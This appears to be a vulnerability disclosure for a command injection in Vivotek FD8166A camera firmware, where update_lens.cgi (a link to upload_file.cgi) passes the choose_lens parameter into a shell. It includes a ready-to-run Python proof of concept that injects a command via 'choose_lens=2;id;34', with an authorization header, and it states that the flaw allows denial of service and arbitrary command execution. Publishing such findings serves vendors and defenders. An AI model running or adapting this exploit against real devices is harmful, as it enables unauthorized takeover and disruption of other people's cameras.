# vivotek-FD8166A-uploadfile-analysis

Vender：vivotek  
Firmware version: FD8166A-VVTK-0204j 
Hardware version: FD8166A  
Exploit Author: ljzjsc  
Vendor Homepage: <https://www.vivotek.com/>  
Hardware Link: <https://www.vivotek.com/fd8166a>  

## Vul detail
update_lens.cgi is a cgi interface that can be accessed in the device and can be accessed directly in the browser.

update_lens.cgi is a soft link in the system, and it is linked to upload_file.cgi.There is a command injection function in upload_file.cgi. The attacker only needs to construct the response payload to execute the response function to achieve the effect of arbitrary execution of the command.

![1706580653940](./vivotek-FD8166A-uploadfile-analysis.assets/1706580653940.png)

We construct the corresponding payload to achieve denial of service and other attacks.

![cfbe0efafeb85d3ea86282a123b659c](./vivotek-FD8166A-uploadfile-analysis.assets/cfbe0efafeb85d3ea86282a123b659c.png)

## PoC
```python
import requests

url = "http://192.168.1.107/cgi-bin/admin/update_lens.cgi?choose_lens=2;id;34"
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Accept": "*/*",
    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding": "gzip, deflate",
    "If-Modified-Since": "0",
    "Authorization": "Basic cm9vdDpsaTEwMTdydWk=",
    "Referer": "http://192.168.1.107/setup/media/lens_configuration.html",
    "Cookie": "webptzmode=continuous; activatedmode=digital; g_mode=1; viewsizemode=100; 4x3=false"
}

response = requests.get(url, headers=headers)
print(response.text)
```

